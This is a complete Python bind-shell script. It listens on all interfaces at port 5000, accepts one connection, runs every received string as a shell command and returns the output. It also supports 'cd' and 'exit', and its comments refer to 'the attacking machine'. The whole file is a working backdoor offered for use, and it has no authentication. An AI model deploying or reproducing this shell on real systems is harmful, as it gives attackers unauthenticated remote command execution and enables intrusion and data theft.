from socket import socket
from subprocess import getoutput
from os import chdir, getcwd
from time import sleep

# Define the address and port, the address 0.0.0.0 refers to accepting connections from any interface
server_address = ('0.0.0.0', 5000)

# Create the socket (the connection)
server_socket = socket()

# Bind the tuple where we specify where to listen
server_socket.bind(server_address)

# Maximum number of clients that can connect:
server_socket.listen(1)

# Wait to receive a connection and accept it:
client_socket, client_address = server_socket.accept()

state = True

while state:
    # Receive the command from the attacking machine
    command = client_socket.recv(4096).decode()

    # If the client sends "exit", close the connection and exit the loop
    if command == 'exit':
        # Close the connection with the client
        client_socket.close()
        # Close the server socket
        server_socket.close()
        state = False
    
    elif command.split(" ")[0] == 'cd':
        # Change the working directory
        chdir(" ".join(command.split(" ")[1:]))
        client_socket.send("current path: {}".format(getcwd()).encode())
    
    else:
        # Execute the command and get its output:
        output = getoutput(command)

        # Send the output to the attacking machine
        client_socket.send(output.encode())
    
    sleep(0.1)
